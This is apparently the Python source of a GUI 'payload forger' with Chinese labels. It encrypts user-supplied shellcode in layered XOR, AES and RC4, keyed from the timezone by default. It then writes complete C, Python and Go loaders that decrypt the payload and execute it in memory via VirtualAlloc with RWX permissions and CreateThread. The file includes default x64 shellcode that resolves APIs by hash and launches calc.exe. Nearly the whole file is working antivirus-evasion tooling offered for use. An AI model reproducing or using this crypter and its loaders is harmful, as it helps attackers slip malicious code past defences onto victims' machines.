import customtkinter as ctk
import tkinter as tk
from tkinter import messagebox
import base64
import hashlib
import time
import os
import re
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad

# ================= 核心加密算法区 =================

def get_timezone_key():
    tz_name = time.tzname[0]
    return hashlib.md5(tz_name.encode()).hexdigest()[:16] 

def xor_encrypt(data: bytes, key: bytes) -> bytes:
    return bytes([data[i] ^ key[i % len(key)] for i in range(len(data))])

def rc4_encrypt(data: bytes, key: bytes) -> bytes:
    S = list(range(256))
    j = 0
    out = bytearray()
    for i in range(256):
        j = (j + S[i] + key[i % len(key)]) % 256
        S[i], S[j] = S[j], S[i]
    i = j = 0
    for char in data:
        i = (i + 1) % 256
        j = (j + S[i]) % 256
        S[i], S[j] = S[j], S[i]
        out.append(char ^ S[(S[i] + S[j]) % 256])
    return bytes(out)

def aes_encrypt(data: bytes, key: bytes) -> bytes:
    aes_key = hashlib.md5(key).digest() 
    cipher = AES.new(aes_key, AES.MODE_ECB)
    return cipher.encrypt(pad(data, AES.block_size))

# ================= UI 界面区 (左右分栏中文版) =================

ctk.set_appearance_mode("dark")
ctk.set_default_color_theme("green")

app = ctk.CTk()
app.geometry("1150x750") # 稍微调大一点，更大气
app.title("载荷加密与生成工具")

# 主容器 (左右分栏)
main_container = ctk.CTkFrame(app, fg_color="transparent")
main_container.pack(fill="both", expand=True, padx=10, pady=10)

# ---- 左侧控制面板 ----
left_frame = ctk.CTkFrame(main_container, width=420, corner_radius=10)
left_frame.pack(side="left", fill="y", padx=10, pady=10)
left_frame.pack_propagate(False) # 固定宽度

# 标题汉化
title_label = ctk.CTkLabel(left_frame, text="[ + ] 载荷锻造器", font=("Microsoft YaHei", 26, "bold"), text_color="#00FF00")
title_label.pack(pady=(20, 15))

label_shellcode = ctk.CTkLabel(left_frame, text="[ 1. 输入 Shellcode (十六进制) ]", font=("Microsoft YaHei", 14, "bold"))
label_shellcode.pack(anchor="w", padx=20, pady=(10, 0))

textbox_shellcode = ctk.CTkTextbox(left_frame, height=150, font=("Consolas", 12))
textbox_shellcode.pack(padx=20, pady=5, fill="x")

default_shellcode = (
    "\\x48\\x81\\xEC\\x00\\x01\\x00\\x00\\x65\\x48\\x8B\\x04\\x25\\x60\\x00\\x00\\x00\\x48\\x8B\\x40\\x18\\x48\\x8B\\x40\\x30\\x48\\x8B\\x70\\x10\\x48\\x8B\\x58\\x40\\x48\\x8B\\x00\\x81\\x7B\\x0C\\x33\\x00\\x32\\x00\\x75\\xEC\\x48\\x8B\\xCE\\x48\\xC7\\xC2\\x32\\x74\\x91\\x0C\\xE8\\xC0\\x00\\x00\\x00\\x4C\\x8B\\xF0\\x48\\xC7\\xC3\\x6C\\x6C\\x00\\x00\\x53\\x48\\xBB\\x75\\x73\\x65\\x72\\x33\\x32\\x2E\\x64\\x53\\x48\\x8B\\xCC\\x48\\x83\\xEC\\x18\\x41\\xFF\\xD6\\x48\\x8B\\xD8\\x48\\x8B\\xCB\\x48\\xC7\\xC2\\x6A\\x0A\\x38\\x1E\\xE8\\x8E\\x00\\x00\\x00\\x4C\\x8B\\xF0\\x4D\\x33\\xC9\\x4D\\x33\\xC0\\x48\\x33\\xD2\\x48\\x33\\xC9\\x41\\xFF\\xD6\\x48\\x8B\\xCE\\x48\\xC7\\xC2\\x51\\x2F\\xA2\\x01\\xE8\\x6D\\x00\\x00\\x00\\x4C\\x8B\\xF0\\x48\\x33\\xC0\\x50\\x48\\xB8\\x63\\x61\\x6C\\x63\\x2E\\x65\\x78\\x65\\x50\\x48\\x8B\\xCC\\x48\\x83\\xEC\\x20\\x48\\xC7\\xC2\\x01\\x00\\x00\\x00\\x41\\xFF\\xD6\\x48\\x8B\\xCE\\x48\\xBA\\x85\\xDF\\xAF\\xBB\\x00\\x00\\x00\\x00\\xE8\\x38\\x00\\x00\\x00\\x4C\\x8B\\xF0\\x48\\xC7\\xC0\\x61\\x64\\x00\\x00\\x50\\x48\\xB8\\x45\\x78\\x69\\x74\\x54\\x68\\x72\\x65\\x50\\x48\\x8B\\xCE\\x48\\x8B\\xD4\\x48\\x83\\xEC\\x20\\x41\\xFF\\xD6\\x4C\\x8B\\xF0\\x48\\x81\\xC4\\x88\\x01\\x00\\x00\\x48\\x83\\xEC\\x18\\x48\\x33\\xC9\\x41\\xFF\\xD6\\xC3\\x48\\x83\\xEC\\x40\\x56\\x48\\x8B\\xFA\\x48\\x8B\\xD9\\x48\\x8B\\x73\\x3C\\x48\\x8B\\xC6\\x48\\xC1\\xE0\\x36\\x48\\xC1\\xE8\\x36\\x48\\x8B\\xB4\\x03\\x88\\x00\\x00\\x00\\x48\\xC1\\xE6\\x20\\x48\\xC1\\xEE\\x20\\x48\\x03\\xF3\\x56\\x8B\\x76\\x20\\x48\\x03\\xF3\\x48\\x33\\xC9\\xFF\\xC9\\xFF\\xC1\\xAD\\x48\\x03\\xC3\\x33\\xD2\\x80\\x38\\x00\\x74\\x0F\\xC1\\xCA\\x07\\x51\\x0F\\xBE\\x08\\x03\\xD1\\x59\\x48\\xFF\\xC0\\xEB\\xEC\\x3B\\xD7\\x75\\xE0\\x5E\\x8B\\x56\\x24\\x48\\x03\\xD3\\x0F\\xBF\\x0C\\x4A\\x8B\\x56\\x1C\\x48\\x03\\xD3\\x8B\\x04\\x8A\\x48\\x03\\xC3\\x5E\\x48\\x83\\xC4\\x40\\xC3"
)
textbox_shellcode.insert("1.0", default_shellcode)

label_enc = ctk.CTkLabel(left_frame, text="[ 2. 加密方式 ]", font=("Microsoft YaHei", 14, "bold"))
label_enc.pack(anchor="w", padx=20, pady=(10, 0))

combo_enc = ctk.CTkComboBox(left_frame, values=["XOR + RC4", "XOR + AES", "XOR + AES + RC4"], font=("Microsoft YaHei", 12), width=380)
combo_enc.pack(padx=20, pady=5)
combo_enc.set("XOR + AES + RC4")

label_key = ctk.CTkLabel(left_frame, text="[ 3. 密钥 Key (留空自动生成) ]", font=("Microsoft YaHei", 14, "bold"))
label_key.pack(anchor="w", padx=20, pady=(10, 0))

entry_key = ctk.CTkEntry(left_frame, width=380, placeholder_text="留空则按时区自动生成")
entry_key.pack(padx=20, pady=5)

label_lang = ctk.CTkLabel(left_frame, text="[ 4. 选择生成语言 ]", font=("Microsoft YaHei", 14, "bold"))
label_lang.pack(anchor="w", padx=20, pady=(10, 0))

lang_frame = ctk.CTkFrame(left_frame, fg_color="transparent")
lang_frame.pack(fill="x", padx=20, pady=5)
var_lang = tk.StringVar(value="Python")

radio_py = ctk.CTkRadioButton(lang_frame, text="Python", variable=var_lang, value="Python", font=("Microsoft YaHei", 13))
radio_py.pack(side="left", padx=(0, 10))
radio_c = ctk.CTkRadioButton(lang_frame, text="C/C++", variable=var_lang, value="C", font=("Microsoft YaHei", 13))
radio_c.pack(side="left", padx=10)
radio_go = ctk.CTkRadioButton(lang_frame, text="Go", variable=var_lang, value="Go", font=("Microsoft YaHei", 13))
radio_go.pack(side="left", padx=10)

# 生成按钮汉化
btn_generate = ctk.CTkButton(left_frame, text=">>> 一键加密并生成代码 <<<", font=("Microsoft YaHei", 16, "bold"), height=50, command=lambda: generate_action(), fg_color="#005500", hover_color="#008800")
btn_generate.pack(side="bottom", fill="x", padx=20, pady=20)

status_label = ctk.CTkLabel(left_frame, text="状态: 就绪", font=("Microsoft YaHei", 12), text_color="gray")
status_label.pack(side="bottom", pady=5)


# ---- 右侧输出面板 ----
right_frame = ctk.CTkFrame(main_container, corner_radius=10, fg_color="#1a1a1a")
right_frame.pack(side="right", fill="both", expand=True, padx=10, pady=10)

# 输出标题汉化
label_output = ctk.CTkLabel(right_frame, text="[ 输出控制台 ]", font=("Microsoft YaHei", 16, "bold"), text_color="#00FF00")
label_output.pack(anchor="w", padx=20, pady=(20, 0))

# 输出框占满右侧
textbox_output = ctk.CTkTextbox(right_frame, font=("Consolas", 13), text_color="#00FF00", fg_color="#0d0d0d", border_width=1, border_color="#333333") 
textbox_output.pack(padx=20, pady=10, fill="both", expand=True)


# ================= 按钮与生成逻辑 =================
def generate_action():
    raw_hex = textbox_shellcode.get("1.0", "end-1c").strip()
    if not raw_hex:
        messagebox.showerror("错误", "Shellcode 不能为空！")
        return

    clean_hex = re.sub(r'[^0-9a-fA-F]', '', raw_hex)
    try:
        shellcode_bytes = bytes.fromhex(clean_hex)
    except ValueError:
        messagebox.showerror("格式错误", "无效的 Hex 格式！")
        return

    user_key = entry_key.get().strip()
    if not user_key:
        key_str = get_timezone_key()
        entry_key.delete(0, "end")
        entry_key.insert(0, key_str)
    else:
        key_str = user_key
    
    key_bytes = key_str.encode()
    enc_mode = combo_enc.get()

    try:
        if enc_mode == "XOR + RC4":
            encrypted_bytes = rc4_encrypt(xor_encrypt(shellcode_bytes, key_bytes), key_bytes)
        elif enc_mode == "XOR + AES":
            encrypted_bytes = aes_encrypt(xor_encrypt(shellcode_bytes, key_bytes), key_bytes)
        elif enc_mode == "XOR + AES + RC4":
            step1 = xor_encrypt(shellcode_bytes, key_bytes)
            step2 = aes_encrypt(step1, key_bytes)
            encrypted_bytes = rc4_encrypt(step2, key_bytes)
    except Exception as e:
        messagebox.showerror("加密错误", f"加密失败: {str(e)}")
        return

    enc_base64 = base64.b64encode(encrypted_bytes).decode('utf-8')

    with open("payload.bin", "wb") as f:
        f.write(encrypted_bytes)

    output_code = f"/*\n * [+] 加密成功！模式: {enc_mode}\n * [+] 原始长度: {len(shellcode_bytes)} 字节\n * [+] 密钥 (Key): {key_str}\n * [+] 文件路径: {os.path.abspath('payload.bin')}\n */\n\n"

    
    selected_lang = var_lang.get()

    if selected_lang == "C":
        c_code = "#define _CRT_SECURE_NO_WARNINGS\n"
        c_code += "#include <windows.h>\n#include <stdio.h>\n#include <stdlib.h>\n#include <string.h>\n"
        if "AES" in enc_mode:
            c_code += "#include <wincrypt.h>\n#pragma comment(lib, \"advapi32.lib\")\n"
        c_code += f"\nunsigned char key[] = \"{key_str}\";\nint key_len = sizeof(key) - 1;\n\n"
        
        c_code += """
void xor_decrypt(unsigned char* data, size_t len) {
    for (size_t i = 0; i < len; i++) {
        data[i] ^= key[i % key_len];
    }
}
"""
        if "RC4" in enc_mode:
            c_code += """
void rc4_decrypt(unsigned char* data, size_t len) {
    unsigned char S[256];
    for (int i = 0; i < 256; i++) S[i] = i;
    int j = 0;
    for (int i = 0; i < 256; i++) {
        j = (j + S[i] + key[i % key_len]) % 256;
        unsigned char tmp = S[i]; S[i] = S[j]; S[j] = tmp;
    }
    int i = 0; j = 0;
    for (size_t k = 0; k < len; k++) {
        i = (i + 1) % 256;
        j = (j + S[i]) % 256;
        unsigned char tmp = S[i]; S[i] = S[j]; S[j] = tmp;
        data[k] ^= S[(S[i] + S[j]) % 256];
    }
}
"""
        if "AES" in enc_mode:
            c_code += """
void aes_decrypt(unsigned char* data, size_t* len) {
    HCRYPTPROV hProv;
    HCRYPTHASH hHash;
    HCRYPTKEY hKey;
    if (!CryptAcquireContext(&hProv, NULL, NULL, PROV_RSA_AES, CRYPT_VERIFYCONTEXT)) return;
    if (!CryptCreateHash(hProv, CALG_MD5, 0, 0, &hHash)) return;
    CryptHashData(hHash, key, key_len, 0);
    
    unsigned char md5_key[16];
    DWORD dwHashLen = 16;
    CryptGetHashParam(hHash, HP_HASHVAL, md5_key, &dwHashLen, 0);

    struct {
        BLOBHEADER hdr;
        DWORD dwKeySize;
        unsigned char rgbKeyData[16];
    } keyBlob = { { PLAINTEXTKEYBLOB, CUR_BLOB_VERSION, 0, CALG_AES_128 }, 16, {0} };
    memcpy(keyBlob.rgbKeyData, md5_key, 16);

    if (!CryptImportKey(hProv, (BYTE*)&keyBlob, sizeof(keyBlob), 0, 0, &hKey)) return;
    DWORD mode = CRYPT_MODE_ECB;
    CryptSetKeyParam(hKey, KP_MODE, (BYTE*)&mode, 0);

    DWORD dwLen = (DWORD)*len;
    if (CryptDecrypt(hKey, 0, TRUE, 0, data, &dwLen)) {
        *len = dwLen;
    }
    CryptDestroyKey(hKey);
    CryptDestroyHash(hHash);
    CryptReleaseContext(hProv, 0);
}
"""
        c_code += """
int main() {
    FILE *fp = fopen("payload.bin", "rb");
    if (!fp) { printf("[-] 找不到 payload.bin\\n"); return 1; }
    fseek(fp, 0, SEEK_END);
    size_t file_size = ftell(fp);
    fseek(fp, 0, SEEK_SET);
    unsigned char *buf = (unsigned char *)malloc(file_size);
    fread(buf, 1, file_size, fp);
    fclose(fp);

    // 解密顺序与加密相反
"""
        if enc_mode == "XOR + RC4":
            c_code += "    rc4_decrypt(buf, file_size);\n    xor_decrypt(buf, file_size);\n"
        elif enc_mode == "XOR + AES":
            c_code += "    aes_decrypt(buf, &file_size);\n    xor_decrypt(buf, file_size);\n"
        elif enc_mode == "XOR + AES + RC4":
            c_code += "    rc4_decrypt(buf, file_size);\n    aes_decrypt(buf, &file_size);\n    xor_decrypt(buf, file_size);\n"

        c_code += """
    void* exec = VirtualAlloc(0, file_size, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
    memcpy(exec, buf, file_size);
    HANDLE hThread = CreateThread(0, 0, (LPTHREAD_START_ROUTINE)exec, 0, 0, 0);
    WaitForSingleObject(hThread, INFINITE);
    return 0;
}
"""
        output_code += c_code

    elif selected_lang == "Python":
        py_decrypt_logic = ""
        if enc_mode == "XOR + RC4":
            py_decrypt_logic = "shellcode = xor_encrypt(rc4_encrypt(enc_data, key), key)"
        elif enc_mode == "XOR + AES":
            py_decrypt_logic = "shellcode = xor_encrypt(aes_decrypt(enc_data, key), key)"
        elif enc_mode == "XOR + AES + RC4":
            py_decrypt_logic = "shellcode = xor_encrypt(aes_decrypt(rc4_encrypt(enc_data, key), key), key)"

        output_code += f"""# coding=utf-8
import base64, ctypes, time, hashlib
from Crypto.Cipher import AES
from Crypto.Util.Padding import unpad

def xor_encrypt(data: bytes, key: bytes) -> bytes:
    return bytes([data[i] ^ key[i % len(key)] for i in range(len(data))])
def rc4_encrypt(data: bytes, key: bytes) -> bytes:
    S = list(range(256)); j = 0; out = bytearray()
    for i in range(256):
        j = (j + S[i] + key[i % len(key)]) % 256; S[i], S[j] = S[j], S[i]
    i = j = 0
    for char in data:
        i = (i + 1) % 256; j = (j + S[i]) % 256; S[i], S[j] = S[j], S[i]
        out.append(char ^ S[(S[i] + S[j]) % 256])
    return bytes(out)
def aes_decrypt(data: bytes, key: bytes) -> bytes:
    cipher = AES.new(hashlib.md5(key).digest(), AES.MODE_ECB)
    return unpad(cipher.decrypt(data), AES.block_size)

enc_data = base64.b64decode("{enc_base64}")
key = b"{key_str}"
{py_decrypt_logic}

print(f"[*] 解密后的长度: {{len(shellcode)}} 字节")
if len(shellcode) < 10: exit()

kernel32 = ctypes.windll.kernel32
kernel32.VirtualAlloc.restype = ctypes.c_void_p
ptr = kernel32.VirtualAlloc(0, len(shellcode), 0x3000, 0x40)
ctypes.memmove(ctypes.c_void_p(ptr), bytes(shellcode), len(shellcode))
h_thread = kernel32.CreateThread(0, 0, ctypes.c_void_p(ptr), 0, 0, 0)
kernel32.WaitForSingleObject(ctypes.c_void_p(h_thread), 0xFFFFFFFF)
time.sleep(5)
"""
    elif selected_lang == "Go":
        go_imports = 'import (\n\t"fmt"\n\t"io/ioutil"\n\t"syscall"\n\t"unsafe"\n\t"crypto/md5"\n'
        if "AES" in enc_mode:
            go_imports += '\t"crypto/aes"\n'
        if "RC4" in enc_mode:
            go_imports += '\t"crypto/rc4"\n'
        go_imports += ')\n'

        go_funcs = """
func xorDecrypt(data []byte, key []byte) []byte {
    out := make([]byte, len(data))
    for i := range data {
        out[i] = data[i] ^ key[i%len(key)]
    }
    return out
}
"""
        if "RC4" in enc_mode:
            go_funcs += """
func rc4Decrypt(data []byte, key []byte) []byte {
    cipher, _ := rc4.NewCipher(key)
    out := make([]byte, len(data))
    cipher.XORKeyStream(out, data)
    return out
}
"""
        if "AES" in enc_mode:
            go_funcs += """
func aesDecrypt(data []byte, key []byte) []byte {
    h := md5.Sum(key)
    block, _ := aes.NewCipher(h[:])
    out := make([]byte, len(data))
    for i := 0; i < len(data); i += aes.BlockSize {
        block.Decrypt(out[i:i+aes.BlockSize], data[i:i+aes.BlockSize])
    }
    padding := int(out[len(out)-1])
    return out[:len(out)-padding]
}
"""
        go_main = """
func main() {
    enc_data, err := ioutil.ReadFile("payload.bin")
    if err != nil { fmt.Println("[-] 找不到 payload.bin"); return }
    key := []byte("""" + key_str + """")

"""
        if enc_mode == "XOR + RC4":
            go_main += "    shellcode := xorDecrypt(rc4Decrypt(enc_data, key), key)\n"
        elif enc_mode == "XOR + AES":
            go_main += "    shellcode := xorDecrypt(aesDecrypt(enc_data, key), key)\n"
        elif enc_mode == "XOR + AES + RC4":
            go_main += "    shellcode := xorDecrypt(aesDecrypt(rc4Decrypt(enc_data, key), key), key)\n"

        go_main += """
    kernel32 := syscall.NewLazyDLL("kernel32.dll")
    VirtualAlloc := kernel32.NewProc("VirtualAlloc")
    RtlMoveMemory := kernel32.NewProc("RtlMoveMemory")
    CreateThread := kernel32.NewProc("CreateThread")
    WaitForSingleObject := kernel32.NewProc("WaitForSingleObject")

    addr, _, _ := VirtualAlloc.Call(0, uintptr(len(shellcode)), 0x3000, 0x40)
    RtlMoveMemory.Call(addr, uintptr(unsafe.Pointer(&shellcode[0])), uintptr(len(shellcode)))
    thread, _, _ := CreateThread.Call(0, 0, addr, 0, 0, 0)
    WaitForSingleObject.Call(thread, 0xFFFFFFFF)
}
"""
        output_code += f"// ================= Go 完整加载器 =================\npackage main\n\n{go_imports}\n{go_funcs}\n{go_main}\n"

    textbox_output.delete("1.0", "end")
    textbox_output.insert("1.0", output_code)
    status_label.configure(text=f"状态: 生成成功 | 模式: {enc_mode}", text_color="#00FF00")

app.mainloop()
